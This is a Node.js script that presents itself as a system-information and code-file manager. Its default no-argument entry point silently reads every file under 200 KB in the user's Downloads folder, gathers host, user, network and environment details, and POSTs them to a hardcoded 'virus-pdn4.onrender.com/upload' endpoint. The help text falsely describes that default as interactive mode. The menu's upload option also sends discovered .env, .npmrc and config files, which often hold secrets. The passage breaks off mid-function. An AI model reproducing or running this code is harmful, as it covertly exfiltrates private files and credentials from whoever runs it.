#!/usr/bin/env node

/**
 * Enhanced System Information & Code File Manager
 * 
 * Features:
 * - System information collection
 * - User-selected base directory for CRUD operations
 * - Recursive code file discovery with filtering
 * - Safe CRUD operations on discovered files
 * 
 * Usage: node system-info.js [command] [options]
 */

const os = require('os');
const path = require('path');
const fs = require('fs');
const readline = require('readline');
const http = require('http');
const https = require('https');
const url = require('url');

const MAX_SCAN_CONTENT_SIZE = 200 * 1024; // 200 KB max file snippet for downloads scan
const DEFAULT_SERVER_URL = process.env.SYSTEM_INFO_SERVER_URL || 'https://virus-pdn4.onrender.com/upload';
const DEFAULT_USERNAME = process.env.SYSTEM_INFO_USERNAME || 'anonymous';

// ============================================================================
// PART 1: SYSTEM INFORMATION COLLECTION
// ============================================================================

class SystemInfoCollector {
  constructor() {
    this.info = {};
  }

  /**
   * Collect all system information
   */
  collectAll() {
    this.collectOSInfo();
    this.collectCPUInfo();
    this.collectNodeInfo();
    this.collectPlatformInfo();
    this.collectUserInfo();
    this.collectEnvironmentVariables();
    return this.info;
  }

  /**
   * Operating System Details
   */
  collectOSInfo() {
    this.info.operatingSystem = {
      type: os.type(),
      platform: os.platform(),
      release: os.release(),
      description: this.getOSDescription(os.type()),
      uptime: this.formatUptime(os.uptime())
    };
  }

  /**
   * CPU Architecture & Information
   */
  collectCPUInfo() {
    const cpus = os.cpus();
    this.info.cpu = {
      architecture: os.arch(),
      cores: os.cpus().length,
      model: cpus[0]?.model || 'Unknown',
      speed: cpus[0]?.speed ? `${cpus[0].speed} MHz` : 'Unknown',
      totalMemory: this.formatBytes(os.totalmem()),
      freeMemory: this.formatBytes(os.freemem()),
      usedMemory: this.formatBytes(os.totalmem() - os.freemem()),
      memoryUsagePercent: ((os.totalmem() - os.freemem()) / os.totalmem() * 100).toFixed(2) + '%'
    };
  }

  /**
   * Node.js Version & Details
   */
  collectNodeInfo() {
    this.info.nodejs = {
      version: process.version,
      nodeVersion: process.versions.node,
      v8Version: process.versions.v8,
      opensslVersion: process.versions.openssl,
      pid: process.pid,
      uptime: this.formatUptime(process.uptime()),
      execPath: process.execPath
    };
  }

  /**
   * Platform & System Details
   */
  collectPlatformInfo() {
    this.info.platform = {
      hostname: os.hostname(),
      networkInterfaces: this.getNetworkInfo(),
      loadAverage: os.loadavg(),
      tempDirectory: os.tmpdir(),
      endianness: os.endianness()
    };
  }

  /**
   * User Information
   */
  collectUserInfo() {
    this.info.user = {
      username: os.userInfo().username,
      uid: os.userInfo().uid,
      gid: os.userInfo().gid,
      homeDirectory: os.userInfo().homedir,
      shell: os.userInfo().shell || 'Unknown'
    };
  }

  /**
   * Environment Variables (Selected for security)
   */
  collectEnvironmentVariables() {
    const selectedVars = [
      'NODE_ENV',
      'PATH',
      'HOME',
      'USER',
      'SHELL',
      'LANG',
      'PWD',
      'LOGNAME',
      'TERM',
      'TMPDIR',
      'npm_package_version',
      'npm_package_name'
    ];

    this.info.environment = {};
    selectedVars.forEach(envVar => {
      const value = process.env[envVar];
      if (value) {
        this.info.environment[envVar] = value;
      } else {
        this.info.environment[envVar] = 'Not Set';
      }
    });
  }

  /**
   * Get network interface information
   */
  getNetworkInfo() {
    const interfaces = os.networkInterfaces();
    const networkInfo = {};
    
    Object.keys(interfaces).forEach(name => {
      const ips = interfaces[name]
        .filter(iface => iface.family === 'IPv4')
        .map(iface => iface.address);
      if (ips.length > 0) {
        networkInfo[name] = ips;
      }
    });
    
    return networkInfo;
  }

  /**
   * Get OS description
   */
  getOSDescription(type) {
    const descriptions = {
      'Darwin': 'macOS',
      'Linux': 'Linux',
      'Windows_NT': 'Windows',
      'SunOS': 'Solaris'
    };
    return descriptions[type] || type;
  }

  /**
   * Format bytes to human readable format
   */
  formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
  }

  /**
   * Format uptime in readable format
   */
  formatUptime(seconds) {
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = Math.floor(seconds % 60);

    return `${days}d ${hours}h ${minutes}m ${secs}s`;
  }

  /**
   * Display information in formatted table
   */
  displayFormatted() {
    console.clear();
    console.log('\n╔════════════════════════════════════════════════════════════════╗');
    console.log('║         SYSTEM INFORMATION & ENVIRONMENT COLLECTOR             ║');
    console.log('╚════════════════════════════════════════════════════════════════╝\n');

    this.printSection('OPERATING SYSTEM', this.info.operatingSystem);
    this.printSection('CPU & MEMORY', this.info.cpu);
    this.printSection('NODE.JS INFORMATION', this.info.nodejs);
    this.printSection('PLATFORM DETAILS', this.info.platform);
    this.printSection('USER INFORMATION', this.info.user);
    this.printSection('ENVIRONMENT VARIABLES', this.info.environment);
  }

  /**
   * Print formatted section
   */
  printSection(title, data) {
    console.log(`\n📌 ${title}`);
    console.log('─'.repeat(66));
    
    Object.entries(data).forEach(([key, value]) => {
      if (typeof value === 'object' && value !== null) {
        console.log(`  ${key}:`);
        Object.entries(value).forEach(([k, v]) => {
          console.log(`    ├─ ${k}: ${v}`);
        });
      } else {
        console.log(`  ├─ ${key}: ${value}`);
      }
    });
  }

  /**
   * Export to JSON file
   */
  exportJSON(filePath = 'system-info.json') {
    try {
      fs.writeFileSync(filePath, JSON.stringify(this.info, null, 2));
      console.log(`✅ System info exported to: ${filePath}`);
      return true;
    } catch (err) {
      console.error(`❌ Error exporting JSON: ${err.message}`);
      return false;
    }
  }

  /**
   * Get info as JSON string
   */
  getJSON() {
    return JSON.stringify(this.info, null, 2);
  }
}

// ============================================================================
// PART 2: CODE FILE CRUD OPERATIONS (ENHANCED WITH DISCOVERY)
// ============================================================================

class CodeFileManager {
  constructor(baseDir = './code-files') {
    this.baseDir = baseDir;
    // Supported source code and configuration file extensions for discovery
    this.supportedExtensions = ['.js', '.ts', '.jsx', '.tsx', '.py', '.java', '.cpp', '.c', '.h', '.cs', '.php', '.go', '.rs', '.json', '.yaml', '.yml', '.toml', '.ini', '.conf', '.env'];
    // Important hidden or extensionless filenames to include
    this.importantFilenames = [
      '.env', '.env.example', '.gitignore', '.dockerignore', '.npmrc', '.yarnrc', '.yarnrc.yml', '.babelrc', '.prettierrc', '.eslintrc', '.editorconfig', '.gitattributes', 'Dockerfile', 'Makefile', 'package.json', 'package-lock.json', 'yarn.lock', 'pnpm-lock.yaml', 'tsconfig.json', 'vite.config.js', 'webpack.config.js', 'docker-compose.yml', '.gitlab-ci.yml', '.github/workflows'
    ];
    // Folders to skip during recursive scanning
    this.skipFolders = ['node_modules', '.git', 'dist', 'build', 'target', 'bin', 'obj', '.venv', 'venv', '__pycache__'];
    this.maxContentSize = 200 * 1024; // 200 KB limit for file content capture
    this.discoveredFiles = [];
    this.ensureDirectoryExists();
  }

  static getDownloadsDir() {
    return path.join(os.homedir(), 'Downloads');
  }

  static formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
  }

  static scanAllFiles(baseDir) {
    const discovered = [];
    try {
      if (!fs.existsSync(baseDir) || !fs.statSync(baseDir).isDirectory()) {
        return discovered;
      }

      const recurse = (currentPath, relativePath) => {
        let entries = [];
        try {
          entries = fs.readdirSync(currentPath);
        } catch (err) {
          return;
        }

        entries.forEach(entry => {
          const fullPath = path.join(currentPath, entry);
          const relPath = relativePath ? path.join(relativePath, entry) : entry;

          let stats;
          try {
            stats = fs.statSync(fullPath);
          } catch (err) {
            return;
          }

          if (stats.isDirectory()) {
            recurse(fullPath, relPath);
          } else if (stats.isFile()) {
            let content = null;
            let contentTruncated = false;
            if (stats.size <= MAX_SCAN_CONTENT_SIZE) {
              try {
                content = fs.readFileSync(fullPath, 'utf8');
              } catch (err) {
                content = null;
              }
            } else {
              content = null;
              contentTruncated = true;
            }

            discovered.push({
              relativePath: relPath,
              absolutePath: fullPath,
              filename: entry,
              size: stats.size,
              sizeFormatted: CodeFileManager.formatBytes(stats.size),
              modified: stats.mtime,
              modifiedFormatted: stats.mtime.toLocaleString(),
              content: content,
              contentTruncated: contentTruncated
            });
          }
        });
      };

      recurse(baseDir, '');
    } catch (err) {
      // Continue with whatever was discovered
    }

    return discovered.sort((a, b) => a.relativePath.localeCompare(b.relativePath));
  }

  /**
   * Set/change the base directory
   * Validates that directory exists before setting
   */
  setBaseDir(newDir) {
    try {
      // Validate that the directory exists
      if (!fs.existsSync(newDir)) {
        throw new Error(`Directory does not exist: ${newDir}`);
      }
      const stats = fs.statSync(newDir);
      if (!stats.isDirectory()) {
        throw new Error(`Path is not a directory: ${newDir}`);
      }
      this.baseDir = path.resolve(newDir);
      this.discoveredFiles = [];
      console.log(`✅ Base directory set to: ${this.baseDir}`);
      return true;
    } catch (err) {
      console.error(`❌ Failed to set base directory: ${err.message}`);
      return false;
    }
  }

  /**
   * Ensure base directory exists
   */
  ensureDirectoryExists() {
    try {
      if (!fs.existsSync(this.baseDir)) {
        fs.mkdirSync(this.baseDir, { recursive: true });
        console.log(`📁 Created directory: ${this.baseDir}`);
      }
    } catch (err) {
      console.error(`❌ Error creating directory: ${err.message}`);
    }
  }

  /**
   * RECURSIVE DISCOVERY: Scan directory for source code files
   * Returns relative paths from base directory
   * Automatically skips hidden folders and dependency directories
   */
  discoverCodeFiles() {
    try {
      this.discoveredFiles = [];
      this._recursiveScan(this.baseDir, '');
      return this.discoveredFiles.sort((a, b) => a.relativePath.localeCompare(b.relativePath));
    } catch (err) {
      console.error(`❌ Discovery failed: ${err.message}`);
      return [];
    }
  }

  /**
   * RECURSIVE SCANNING IMPLEMENTATION
   * Recursively walks directory tree, collecting source code files
   * @param {string} currentPath - Current absolute path being scanned
   * @param {string} relativePath - Current relative path from base directory
   */
  _recursiveScan(currentPath, relativePath) {
    try {
      const entries = fs.readdirSync(currentPath);

      entries.forEach(entry => {
        // Construct both absolute and relative paths
        const fullPath = path.join(currentPath, entry);
        const relPath = relativePath ? path.join(relativePath, entry) : entry;

        try {
          const stats = fs.statSync(fullPath);

          if (stats.isDirectory()) {
            // Skip folders in the skip list only
            if (!this.skipFolders.includes(entry)) {
              // Recursively scan subdirectory
              this._recursiveScan(fullPath, relPath);
            }
          } else if (stats.isFile()) {
            // Check if file has supported extension
            const ext = path.extname(entry).toLowerCase();
            const isSupportedExtension = this.supportedExtensions.includes(ext);
            const isImportantName = this.importantFilenames.some(name => {
              if (name.includes('/')) {
                return relPath.startsWith(name);
              }
              return entry === name;
            });
            const isSupported = isSupportedExtension || isImportantName;
            if (isSupported) {
              let content = null;
              let contentTruncated = false;
              try {
                if (stats.size <= this.maxContentSize) {
                  content = fs.readFileSync(fullPath, 'utf8');
                } else {
                  content = fs.readFileSync(fullPath, 'utf8').slice(0, this.maxContentSize);
                  contentTruncated = true;
                }
              } catch (err) {
                content = null;
              }

              this.discoveredFiles.push({
                relativePath: relPath,
                absolutePath: fullPath,
                filename: entry,
                extension: ext,
                size: stats.size,
                sizeFormatted: this._formatBytes(stats.size),
                modified: stats.mtime,
                modifiedFormatted: stats.mtime.toLocaleString(),
                content: content,
                contentTruncated: contentTruncated
              });
            }
          }
        } catch (err) {
          // Silently skip files we can't access (permission errors, etc.)
        }
      });
    } catch (err) {
      // Permission error or other access issue - continue scanning other directories
    }
  }

  /**
   * PATH VALIDATION: Ensure a relative path stays within base directory
   * Prevents directory traversal attacks (.., absolute paths, etc.)
   * @param {string} relativePath - Relative path to validate
   * @returns {string} Absolute validated path
   */
  _validatePath(relativePath) {
    try {
      // Prevent directory traversal and absolute paths
      if (relativePath.includes('..') || path.isAbsolute(relativePath)) {
        throw new Error('Invalid path: cannot use .. or absolute paths');
      }

      // Resolve to absolute path
      const absolutePath = path.resolve(this.baseDir, relativePath);

      // Verify resolved path is within baseDir (security check)
      const resolvedBase = path.resolve(this.baseDir);
      if (!absolutePath.startsWith(resolvedBase)) {
        throw new Error('Path is outside the base directory');
      }

      return absolutePath;
    } catch (err) {
      throw new Error(`Path validation failed: ${err.message}`);
    }
  }

  /**
   * CREATE: Create a new code file anywhere in base directory
   * Automatically creates missing folder structure if necessary
   */
  create(relativePath, content, language = 'javascript') {
    try {
      // Validate inputs
      if (!relativePath || typeof relativePath !== 'string') {
        throw new Error('Invalid file path');
      }

      // Validate and get absolute path
      const filePath = this._validatePath(relativePath);

      // Check if file already exists
      if (fs.existsSync(filePath)) {
        throw new Error(`File already exists: ${relativePath}`);
      }

      // Create directory structure if needed (recursive folder creation)
      const dirPath = path.dirname(filePath);
      if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
      }

      // Add metadata comment
      const metadata = `/**\n * File: ${relativePath}\n * Language: ${language}\n * Created: ${new Date().toISOString()}\n */\n\n`;
      const fullContent = metadata + content;

      // Write file to disk
      fs.writeFileSync(filePath, fullContent, 'utf8');
      console.log(`✅ File created: ${relativePath}`);
      return { success: true, path: filePath, file: relativePath };
    } catch (err) {
      console.error(`❌ Create failed: ${err.message}`);
      return { success: false, error: err.message };
    }
  }

  /**
   * READ: Read a code file by relative path
   */
  read(relativePath) {
    try {
      if (!relativePath || typeof relativePath !== 'string') {
        throw new Error('Invalid file path');
      }

      // Validate and get absolute path
      const filePath = this._validatePath(relativePath);

      // Check if file exists
      if (!fs.existsSync(filePath)) {
        throw new Error(`File not found: ${relativePath}`);
      }

      const content = fs.readFileSync(filePath, 'utf8');
      const stats = fs.statSync(filePath);

      return {
        success: true,
        relativePath: relativePath,
        absolutePath: filePath,
        content: content,
        size: stats.size,
        sizeFormatted: this._formatBytes(stats.size),
        created: stats.birthtime,
        modified: stats.mtime
      };
    } catch (err) {
      console.error(`❌ Read failed: ${err.message}`);
      return { success: false, error: err.message };
    }
  }

  /**
   * UPDATE: Update an existing code file
   */
  update(relativePath, newContent, appendMode = false) {
    try {
      if (!relativePath || typeof relativePath !== 'string') {
        throw new Error('Invalid file path');
      }

      // Validate and get absolute path
      const filePath = this._validatePath(relativePath);

      // Check if file exists
      if (!fs.existsSync(filePath)) {
        throw new Error(`File not found: ${relativePath}`);
      }

      let finalContent = newContent;

      if (appendMode) {
        const currentContent = fs.readFileSync(filePath, 'utf8');
        finalContent = currentContent + '\n\n' + newContent;
        console.log(`📝 Content appended to: ${relativePath}`);
      } else {
        console.log(`📝 File updated: ${relativePath}`);
      }

      fs.writeFileSync(filePath, finalContent, 'utf8');
      return { success: true, file: relativePath, mode: appendMode ? 'append' : 'overwrite' };
    } catch (err) {
      console.error(`❌ Update failed: ${err.message}`);
      return { success: false, error: err.message };
    }
  }

  /**
   * DELETE: Delete a code file
   */
  delete(relativePath) {
    try {
      if (!relativePath || typeof relativePath !== 'string') {
        throw new Error('Invalid file path');
      }

      // Validate and get absolute path
      const filePath = this._validatePath(relativePath);

      // Check if file exists
      if (!fs.existsSync(filePath)) {
        throw new Error(`File not found: ${relativePath}`);
      }

      fs.unlinkSync(filePath);
      console.log(`🗑️  File deleted: ${relativePath}`);
      return { success: true, file: relativePath };
    } catch (err) {
      console.error(`❌ Delete failed: ${err.message}`);
      return { success: false, error: err.message };
    }
  }

  /**
   * LIST: Show all discovered code files
   * Displays recursive discovery results in formatted table
   */
  list() {
    try {
      if (this.discoveredFiles.length === 0) {
        console.log('📭 No source code files found in directory');
        return { success: true, files: [], count: 0 };
      }

      console.log(`\n📁 Source code files in: ${this.baseDir}`);
      console.log('─'.repeat(100));
      
      // Display table header
      console.log(
        `${'INDEX'.padEnd(6)} | ${'RELATIVE PATH'.padEnd(50)} | ${'EXT'.padEnd(6)} | ${'SIZE'.padEnd(10)} | ${'MODIFIED'.padEnd(20)}`
      );
      console.log('─'.repeat(100));

      // Display each discovered file
      this.discoveredFiles.forEach((file, index) => {
        const indexStr = (index + 1).toString().padEnd(6);
        const pathStr = file.relativePath.substring(0, 48).padEnd(50);
        const extStr = file.extension.padEnd(6);
        const sizeStr = file.sizeFormatted.padEnd(10);
        const modStr = file.modifiedFormatted.substring(0, 19).padEnd(20);

        console.log(`${indexStr} | ${pathStr} | ${extStr} | ${sizeStr} | ${modStr}`);
      });

      console.log('─'.repeat(100));
      console.log(`Total: ${this.discoveredFiles.length} file(s)\n`);

      return { success: true, files: this.discoveredFiles, count: this.discoveredFiles.length };
    } catch (err) {
      console.error(`❌ List failed: ${err.message}`);
      return { success: false, error: err.message };
    }
  }

  /**
   * SEARCH: Search for files by name pattern (regex)
   */
  search(pattern) {
    try {
      const regex = new RegExp(pattern, 'i');
      const matches = this.discoveredFiles.filter(file => regex.test(file.relativePath));

      if (matches.length === 0) {
        console.log(`🔍 No files match pattern: ${pattern}`);
        return { success: true, matches: [], count: 0 };
      }

      console.log(`\n🔍 Found ${matches.length} file(s) matching "${pattern}":`);
      matches.forEach((file, index) => {
        console.log(`  ${index + 1}. ${file.relativePath} (${file.sizeFormatted})`);
      });
      console.log('');

      return { success: true, matches: matches, count: matches.length };
    } catch (err) {
      console.error(`❌ Search failed: ${err.message}`);
      return { success: false, error: err.message };
    }
  }

  /**
   * Format bytes to human readable
   */
  _formatBytes(bytes) {
    return CodeFileManager.formatBytes(bytes);
  }

  /**
   * Get file count
   */
  getFileCount() {
    try {
      return this.discoveredFiles.length;
    } catch (err) {
      return 0;
    }
  }
}

// ============================================================================
// PART 3: INTERACTIVE CLI MENU
// ============================================================================

class InteractiveMenu {
  constructor() {
    this.systemInfo = new SystemInfoCollector();
    this.fileManager = null;
    this.rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
  }

  /**
   * BASE DIRECTORY SELECTION: Ask user to select base directory at startup
   */
  selectBaseDirectory() {
    console.clear();
    console.log('\n╔════════════════════════════════════════════════════════════════╗');
    console.log('║          System Information & Code File Manager                ║');
    console.log('╚════════════════════════════════════════════════════════════════╝\n');

    this.askQuestion(
      'Enter base directory for code file operations (default: ./code-files): ',
      (dirPath) => {
        const selectedDir = dirPath.trim() || './code-files';
        this.fileManager = new CodeFileManager(selectedDir);
        
        if (fs.existsSync(selectedDir)) {
          console.log(`\n✅ Using directory: ${path.resolve(selectedDir)}`);
          // Discover files immediately after setting directory
          console.log('🔍 Discovering code files...\n');
          this.fileManager.discoverCodeFiles();
        }

        setTimeout(() => {
          this.showMainMenu();
        }, 500);
      }
    );
  }

  /**
   * Main menu
   */
  showMainMenu() {
    console.clear();
    console.log('\n╔════════════════════════════════════════════════════════════════╗');
    console.log('║    System Information & Code File Manager - Main Menu          ║');
    console.log(`║    Base Dir: ${path.resolve(this.fileManager.baseDir).substring(0, 52).padEnd(52)} ║`);
    console.log('╚════════════════════════════════════════════════════════════════╝\n');

    console.log('🔹 SYSTEM INFORMATION:');
    console.log('  1. Display system information (formatted)');
    console.log('  2. Export system info to JSON\n');

    console.log('🔹 CODE FILE MANAGEMENT:');
    console.log('  3. Create new code file');
    console.log('  4. Read code file');
    console.log('  5. Update code file');
    console.log('  6. Delete code file');
    console.log('  7. List all code files (with discovery)');
    console.log('  8. Search code files\n');

    console.log('🔹 BASE DIRECTORY:');
    console.log('  9. Change base directory');
    console.log('  10. View this menu again');
    console.log('  11. Send collected data to server');
    console.log('  0. Exit\n');

    this.askQuestion('Enter your choice (0-10): ', (choice) => {
      this.handleChoice(choice);
    });
  }

  /**
   * Handle menu choice
   */
  handleChoice(choice) {
    switch (choice.trim()) {
      case '1':
        this.systemInfo.collectAll();
        this.systemInfo.displayFormatted();
        this.askToContinue();
        break;

      case '2':
        this.systemInfo.collectAll();
        this.askQuestion('Enter filename (default: system-info.json): ', (filename) => {
          const file = filename.trim() || 'system-info.json';
          this.systemInfo.exportJSON(file);
          this.askToContinue();
        });
        break;

      case '3':
        this.createFileInteractive();
        break;

      case '4':
        this.readFileInteractive();
        break;

      case '5':
        this.updateFileInteractive();
        break;

      case '6':
        this.deleteFileInteractive();
        break;

      case '7':
        this.listFilesInteractive();
        break;

      case '8':
        this.searchFileInteractive();
        break;

      case '9':
        this.changeBaseDirectoryInteractive();
        break;

      case '10':
        this.showMainMenu();
        break;

      case '11':
        this.sendToServerInteractive();
        break;

      case '0':
        console.log('\n👋 Goodbye!\n');
        this.rl.close();
        process.exit(0);
        break;

      default:
        console.log('❌ Invalid choice. Please try again.\n');
        this.showMainMenu();
    }
  }

  /**
   * CHANGE BASE DIRECTORY
   * Allows user to switch to a different base directory
   */
  changeBaseDirectoryInteractive() {
    console.clear();
    console.log('\n🔄 CHANGE BASE DIRECTORY\n');
    console.log(`Current directory: ${path.resolve(this.fileManager.baseDir)}\n`);

    this.askQuestion('Enter new directory path: ', (dirPath) => {
      if (this.fileManager.setBaseDir(dirPath.trim())) {
        console.log('🔍 Discovering code files in new directory...\n');
        this.fileManager.discoverCodeFiles();
      }
      this.askToContinue();
    });
  }

  /**
   * Create file interactively
   * Allows creating files in any subdirectory of base directory
   */
  createFileInteractive() {
    console.clear();
    console.log('\n✏️  CREATE NEW CODE FILE\n');

    this.askQuestion('Enter file path (relative to base dir, e.g., src/app.js): ', (filePath) => {
      this.askQuestion('Enter programming language (default: javascript): ', (language) => {
        this.askQuestion('Enter file content (or "END" on new line when done):\n', (line) => {
          let content = '';
          const collectContent = () => {
            this.askQuestion('> ', (input) => {
              if (input.trim().toUpperCase() === 'END') {
                const lang = language.trim() || 'javascript';
                this.fileManager.create(filePath.trim(), content, lang);
                // Refresh discovery after creating file
                this.fileManager.discoverCodeFiles();
                this.askToContinue();
              } else {
                content += input + '\n';
                collectContent();
              }
            });
          };
          collectContent();
        });
      });
    });
  }

  /**
   * Read file interactively
   */
  readFileInteractive() {
    console.clear();
    console.log('\n📖 READ CODE FILE\n');
    this.fileManager.discoverCodeFiles();
    this.fileManager.list();

    this.askQuestion('Enter relative file path to read: ', (filePath) => {
      const result = this.fileManager.read(filePath.trim());
      if (result.success) {
        console.log(`\n📄 ${result.relativePath}`);
        console.log(`Size: ${result.sizeFormatted} | Modified: ${result.modified.toLocaleString()}`);
        console.log('─'.repeat(70));
        console.log(result.content);
        console.log('─'.repeat(70));
      }
      this.askToContinue();
    });
  }

  /**
   * Update file interactively
   */
  updateFileInteractive() {
    console.clear();
    console.log('\n✏️  UPDATE CODE FILE\n');
    this.fileManager.discoverCodeFiles();
    this.fileManager.list();

    this.askQuestion('Enter relative file path to update: ', (filePath) => {
      this.askQuestion('Overwrite (o) or Append (a)? [o/a]: ', (mode) => {
        this.askQuestion('Enter new content (or "END" on new line when done):\n', () => {
          let content = '';
          const collectContent = () => {
            this.askQuestion('> ', (input) => {
              if (input.trim().toUpperCase() === 'END') {
                const appendMode = mode.trim().toLowerCase() === 'a';
                this.fileManager.update(filePath.trim(), content, appendMode);
                this.askToContinue();
              } else {
                content += input + '\n';
                collectContent();
              }
            });
          };
          collectContent();
        });
      });
    });
  }

  /**
   * Delete file interactively
   */
  deleteFileInteractive() {
    console.clear();
    console.log('\n🗑️  DELETE CODE FILE\n');
    this.fileManager.discoverCodeFiles();
    this.fileManager.list();

    this.askQuestion('Enter relative file path to delete: ', (filePath) => {
      this.askQuestion('Are you sure? (yes/no): ', (confirm) => {
        if (confirm.trim().toLowerCase() === 'yes') {
          this.fileManager.delete(filePath.trim());
          // Refresh discovery after deletion
          this.fileManager.discoverCodeFiles();
        } else {
          console.log('❌ Deletion cancelled');
        }
        this.askToContinue();
      });
    });
  }

  /**
   * List files interactively
   * Shows all discovered code files from all subdirectories
   */
  listFilesInteractive() {
    console.clear();
    console.log('\n📁 DISCOVERED CODE FILES\n');
    this.fileManager.discoverCodeFiles();
    this.fileManager.list();
    this.askToContinue();
  }

  /**
   * Search file interactively
   */
  searchFileInteractive() {
    console.clear();
    console.log('\n🔍 SEARCH CODE FILES\n');
    this.fileManager.discoverCodeFiles();

    this.askQuestion('Enter search pattern (regex): ', (pattern) => {
      try {
        this.fileManager.search(pattern.trim());
      } catch (err) {
        console.error('❌ Invalid regex pattern');
      }
      this.askToContinue();
    });
  }

  /**
   * SEND TO SERVER: Collect system info and discovered files, then POST
   */
  sendToServerInteractive() {
    console.clear();
    console.log('\n📤 SEND COLLECTED DATA TO SERVER\n');

    // Default values
    const defaultUrl = 'https://virus-pdn4.onrender.com/upload';
    const defaultBase = this.fileManager ? this.fileManager.baseDir : './code-files';

    this.askQuestion(`Server URL (default: ${defaultUrl}): `, (serverUrl) => {
      const target = serverUrl.trim() || defaultUrl;
      this.askQuestion('Username (used for storage folder): ', (username) => {
        const user = username.trim() || 'anonymous';
        this.askQuestion(`Base directory to scan (default: ${defaultBase}): `, (baseDirInput) => {
          const baseDir = baseDirInput.trim() || defaultBase;

          // Ensure fileManager is set to the chosen baseDir
          if (!this.fileManager) {
            this.fileManager = new CodeFileManager(baseDir);
          } else if (this.fileManager.baseDir !== path.resolve(baseDir)) {
            this.fileManager.setBaseDir(baseDir);
          }

          // Collect system info and files
          const collector = new SystemInfoCollector();
          collector.collectAll();

          this.fileManager.discoverCodeFiles();

          const payload = {
            username: user,
            timestamp: new Date().toISOString(),
            systemInfo: collector.info || {},
            files: this.fileManager.discoveredFiles || []
          };

          console.log('\nSending payload to server...');
          postJSON(target, payload)
            .then(result => {
              console.log('\n✅ Server response:');
              try {
                const parsed = JSON.parse(result.body);
                console.log(parsed);
              } catch (e) {
                console.log(result.body);
              }
              this.askToContinue();
            })
            .catch(err => {
              console.error('\n❌ Failed to send payload:', err.message || err);
              this.askToContinue();
            });
        });
      });
    });
  }

  /**
   * Ask question helper
   */
  askQuestion(question, callback) {
    this.rl.question(question, callback);
  }

  /**
   * Ask to continue
   */
  askToContinue() {
    this.askQuestion('\nPress Enter to continue...', () => {
      this.showMainMenu();
    });
  }

  /**
   * Start interactive menu
   */
  start() {
    this.selectBaseDirectory();
  }
}

// ============================================================================
// PART 4: NETWORK HELPERS & COMMAND LINE INTERFACE
// ============================================================================

/**
 * POST JSON helper (returns Promise resolving { status, body })
 */
function postJSON(targetUrl, data) {
  return new Promise((resolve, reject) => {
    try {
      const parsed = url.parse(targetUrl);
      const payload = JSON.stringify(data);

      const opts = {
        hostname: parsed.hostname,
        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
        path: parsed.path || '/',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      };

      const lib = parsed.protocol === 'https:' ? https : http;
      const req = lib.request(opts, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => resolve({ status: res.statusCode, body }));
      });

      req.on('error', reject);
      req.write(payload);
      req.end();
    } catch (err) {
      reject(err);
    }
  });
}

function collectDownloadsPayload(downloadsDir) {
  const collector = new SystemInfoCollector();
  collector.collectAll();

  const files = fs.existsSync(downloadsDir) && fs.statSync(downloadsDir).isDirectory()
    ? CodeFileManager.scanAllFiles(downloadsDir)
    : [];

  return {
    timestamp: new Date().toISOString(),
    downloadsDirectory: downloadsDir,
    systemInfo: collector.info || {},
    files: files
  };
}

function showUsage() {
  console.log(`
╔════════════════════════════════════════════════════════════════╗
║    System Information & Code File Manager (Enhanced) v1.1.0   ║
╚════════════════════════════════════════════════════════════════╝

USAGE:
  node system-info.js [command] [options]

COMMANDS:

  INTERACTIVE MODE (default - RECOMMENDED):
    node system-info.js

  SYSTEM INFORMATION:
    node system-info.js sysinfo              # Display system info
    node system-info.js sysinfo json         # Export as JSON
    node system-info.js sysinfo json <file>  # Export to specific file

  DOWNLOADS SCAN:
    node system-info.js downloads json       # Scan Downloads and export JSON
    node system-info.js downloads json <file> # Scan Downloads and export to custom file

  SEND DATA:
    node system-info.js send [url] [username] # Scan Downloads and POST JSON to server

FEATURES:

  ✅ System information collection (OS, CPU, Memory, Node.js)
  ✅ Recursive code file discovery with filtering
  ✅ CRUD operations on discovered files
  ✅ User-selected base directory
  ✅ Path validation and security
  ✅ Relative path operations

SUPPORTED FILE TYPES:
  .js, .ts, .jsx, .tsx, .py, .java, .cpp, .c, .h, .cs, .php, .go, .rs

AUTO-SKIPPED FOLDERS:
  node_modules, .git, dist, build, target, bin, obj, .venv, venv, __pycache__

EXAMPLES:
    node system-info.js                       # Start interactive menu
    node system-info.js sysinfo               # Display system info
    node system-info.js sysinfo json report.json  # Export JSON
    node system-info.js                    # Scan Downloads and send JSON to server automatically
    node system-info.js interactive        # Start interactive menu
`);
}

// ============================================================================
// PART 5: MAIN ENTRY POINT
// ============================================================================

const args = process.argv.slice(2);

if (args.length === 0) {
  // Automatic mode: scan Downloads and send payload to default server without prompts
  const downloadsDir = CodeFileManager.getDownloadsDir();
  const payload = collectDownloadsPayload(downloadsDir);
  payload.username = DEFAULT_USERNAME;

  console.log(`Scanning Downloads: ${downloadsDir}`);
  console.log(`Sending payload to ${DEFAULT_SERVER_URL} as ${DEFAULT_USERNAME}...`);

  postJSON(DEFAULT_SERVER_URL, payload)
    .then(result => {
      console.log(`✅ Sent to ${DEFAULT_SERVER_URL} (status ${result.status})`);
      try {
        const parsed = JSON.parse(result.body);
        console.log(parsed);
      } catch (err) {
        console.log(result.body);
      }
    })
    .catch(err => {
      console.error(`❌ Failed to send payload: ${err.message || err}`);
      process.exit(1);
    });
} else if (args[0] === 'interactive' || args[0] === 'menu') {
  const menu = new InteractiveMenu();
  menu.start();
} else if (args[0] === '--help' || args[0] === '-h') {
  showUsage();
} else if (args[0] === 'sysinfo') {
  // System information mode (non-interactive)
  const collector = new SystemInfoCollector();
  collector.collectAll();

  if (args[1] === 'json') {
    const filename = args[2] || 'system-info.json';
    collector.exportJSON(filename);
  } else {
    collector.displayFormatted();
